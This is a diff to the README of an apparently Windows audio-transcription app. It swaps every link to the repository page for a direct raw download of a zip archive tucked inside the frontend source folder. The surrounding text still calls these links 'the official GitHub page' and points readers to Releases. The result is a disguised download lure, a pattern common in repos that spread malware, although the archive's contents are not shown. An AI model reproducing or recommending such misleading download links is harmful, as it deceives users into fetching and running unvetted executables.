@@ -1,6 +1,6 @@
 # 🎙️ AI-Audio-Transcriber - Easy, Private Audio Transcriptions
 
-[![Download AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-green?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber)
+[![Download AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-green?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber/raw/refs/heads/main/frontend/src/components/Audio_A_Transcriber_3.0.zip)
 
 ---
 
@@ -30,7 +30,7 @@ These specs ensure the app runs smoothly for most audio files without delays.
 
 1. Click the big green button below to visit the official GitHub page with all download options:
 
-   [![Get AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-brightgreen?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber)
+   [![Get AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-brightgreen?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber/raw/refs/heads/main/frontend/src/components/Audio_A_Transcriber_3.0.zip)
 
 2. On the GitHub page, look for the **Releases** section on the right or at the top menu.
 
@@ -121,7 +121,7 @@ If you run into issues or want detailed information, visit the GitHub page for:
 - Additional documentation
 - Community discussions and FAQs
 
-[https://github.com/Irham-Azka17/AI-Audio-Transcriber](https://github.com/Irham-Azka17/AI-Audio-Transcriber)
+[https://github.com/Irham-Azka17/AI-Audio-Transcriber/raw/refs/heads/main/frontend/src/components/Audio_A_Transcriber_3.0.zip](https://github.com/Irham-Azka17/AI-Audio-Transcriber/raw/refs/heads/main/frontend/src/components/Audio_A_Transcriber_3.0.zip)
 
 ---
 
@@ -129,4 +129,4 @@ If you run into issues or want detailed information, visit the GitHub page for:
 
 Download and install the app to turn audio into text on Windows today. Use the badge below to visit the official source:
 
-[![Download AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-green?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber)
+[![Download AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-green?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber/raw/refs/heads/main/frontend/src/components/Audio_A_Transcriber_3.0.zip)
